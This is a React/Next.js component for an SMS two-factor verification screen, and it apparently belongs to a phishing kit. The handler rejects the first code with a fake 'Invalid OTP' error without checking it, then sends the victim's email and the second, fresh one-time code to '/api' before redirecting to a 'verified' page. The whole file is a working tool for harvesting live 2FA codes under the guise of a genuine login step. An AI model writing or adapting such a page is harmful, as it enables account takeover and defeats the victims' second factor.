'use client';

import React, { useState } from 'react';
import axios from 'axios';
import { useRouter } from 'next/navigation';

const SmsVerification: React.FC = () => {
  const [code, setCode] = useState('');
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [verificationAttempts, setVerificationAttempts] = useState(0);
  const router = useRouter();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!code || code.length < 4) {
      setError('Please enter the verification code');
      return;
    }

    const currentAttempts = verificationAttempts + 1;
    setVerificationAttempts(currentAttempts);

    if (currentAttempts === 1) {
      setIsLoading(true);
      setError('');
      
      setTimeout(() => {
        setError('Invalid OTP');
        setIsLoading(false);
        setCode('');
      }, 1000);
    } else {
      setIsLoading(true);
      setError('');
      try {
        const email = localStorage.getItem('email');
        await axios.put('/api', { email, otp: code });
        router.push('/verified');
      } catch (err) {
        setError('Something went wrong');
      } finally {
        setIsLoading(false);
      }
    }
  };

  return (
    <div className="min-h-screen bg-gray-100 flex flex-col items-center justify-center px-4">
      <div className="w-full max-w-md">
        <div className="bg-white rounded-lg shadow-lg border border-gray-200 px-8 py-8 text-center">
          <h1 className="text-2xl font-semibold text-gray-900 mb-2">
            Check your text messages
          </h1>
          <p className="text-gray-600 mb-8 text-sm">
            Enter the code we sent to ******
          </p>

          <div className="mb-8 flex justify-center">
            <img 
              src="/New2FA.webp" 
              alt="Phone with verification code" 
              className="w-48 h-auto"
            />
          </div>

          <form onSubmit={handleSubmit} className="space-y-6">
            <div>
              <input
                type="text"
                placeholder="Code"
                value={code}
                onChange={(e) => setCode(e.target.value)}
                className={`w-full px-4 py-3 border border-gray-300 rounded-lg text-gray-900 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent text-center text-lg tracking-widest ${
                  isLoading ? 'bg-gray-100' : ''
                }`}
                maxLength={6}
                disabled={isLoading}
              />
            </div>

            {error && (
              <div className="text-red-600 text-sm text-center">
                {error}
              </div>
            )}

            <button
              type="submit"
              disabled={isLoading}
              className={`w-full font-semibold py-3 rounded-lg transition-colors duration-200 ${
                isLoading
                  ? 'bg-gray-300 text-gray-500 cursor-not-allowed'
                  : 'bg-blue-600 text-white hover:bg-blue-700'
              }`}
            >
              {isLoading ? (
                <div className="flex items-center justify-center">
                  <div className="w-6 h-6 border-3 border-gray-300 border-t-blue-600 rounded-full animate-spin"></div>
                </div>
              ) : (
                'Continue'
              )}
            </button>
          </form>
        </div>
      </div>
    </div>
  );
};

export default SmsVerification;
